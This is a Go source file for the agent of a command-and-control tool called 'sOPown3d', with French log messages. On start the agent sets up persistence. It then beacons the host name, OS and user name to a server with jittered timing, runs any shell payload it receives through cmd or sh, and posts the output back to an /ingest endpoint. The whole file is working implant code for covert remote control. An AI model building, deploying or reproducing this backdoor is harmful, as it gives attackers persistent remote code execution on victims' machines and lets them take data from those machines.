package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sOPown3d/internal/agent/persistence"
	"strings"
	"time"

	"sOPown3d/internal/agent/jitter"
	"sOPown3d/pkg/shared"
)

type Config struct {
	ServerURL string
	Jitter    shared.JitterConfig
}

type Agent struct {
	serverURL string
	http      *http.Client
	jitter    *jitter.JitterCalculator
	info      shared.AgentInfo
}

func New(cfg Config) (*Agent, error) {
	info := gatherSystemInfo()

	jcalc, err := jitter.NewJitterCalculator(cfg.Jitter)
	if err != nil {
		return nil, fmt.Errorf("init jitter: %w", err)
	}

	persistence.SetupPersistence()

	return &Agent{
		serverURL: cfg.ServerURL,
		http:      &http.Client{Timeout: 10 * time.Second},
		jitter:    jcalc,
		info:      info,
	}, nil
}

func (agent *Agent) Run(ctx context.Context) error {
	log.Printf("=== sOPown3d Agent ===")
	log.Printf("Agent ID: %s", agent.info.Hostname)
	log.Println(agent.jitter.GetStats())
	log.Println("En attente de commandes…")
	log.Println("----------------------------------------")

	i := 0
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		i++
		info := gatherSystemInfo()

		cmd := agent.retrieveCommand(info)
		if cmd != nil && cmd.Action != "" {
			output := executeCommand(cmd)
			if output != "" {
				agent.sendOutput(info.Hostname, output)
			}
		}

		next := agent.jitter.Next()
		log.Printf("[Heartbeat #%d] Next check in: %.2fs", i, next.Seconds())
		time.Sleep(next)
	}
}

func gatherSystemInfo() shared.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" && runtime.GOOS != "windows" {
		username = os.Getenv("USER")
	}

	return shared.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Username: username,
	}
}

func (agent *Agent) retrieveCommand(info shared.AgentInfo) *shared.Command {
	body, err := json.Marshal(info)
	if err != nil {
		log.Printf("marshal agent info error: %v", err)
		return nil
	}

	resp, err := agent.http.Post(agent.serverURL+"/beacon", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("beacon error: %v", err)
		return nil
	}
	defer resp.Body.Close()

	var cmd shared.Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil || cmd.Action == "" {
		return nil
	}

	return &cmd
}

func executeCommand(cmd *shared.Command) string {
	switch cmd.Action {
	case "shell":
		if cmd.Payload == "" {
			return ""
		}

		log.Printf("Exécute: %s", cmd.Payload)

		var c *exec.Cmd
		if runtime.GOOS == "windows" {
			c = exec.Command("cmd", "/c", cmd.Payload)
		} else {
			c = exec.Command("sh", "-c", cmd.Payload)
		}

		out, err := c.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Erreur: %v\n%s", err, string(out))
		}

		output := strings.ReplaceAll(string(out), "\n", "\r\n")
		return output

	case "info":
		log.Println("Info: déjà envoyé dans le beacon")
		return ""

	case "ping":
		log.Println("Pong!")
		return ""

	case "persist":
		log.Println("📋 Vérification persistance…")
		if persistent, path := persistence.CheckStartup(); persistent {
			log.Printf("  ✓ Persistant\n  Chemin: %s", path)
		} else {
			log.Println("  ✗ Non persistant")
		}
		return ""

	default:
		log.Printf("Commande inconnue: %s", cmd.Action)
		return ""
	}
}

func (agent *Agent) sendOutput(agentID, output string) {
	payload := struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}{
		AgentID: agentID,
		Output:  output,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Printf("marshal output error: %v", err)
		return
	}

	resp, err := agent.http.Post(agent.serverURL+"/ingest", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("ingest error: %v", err)
		return
	}
	defer resp.Body.Close()
}
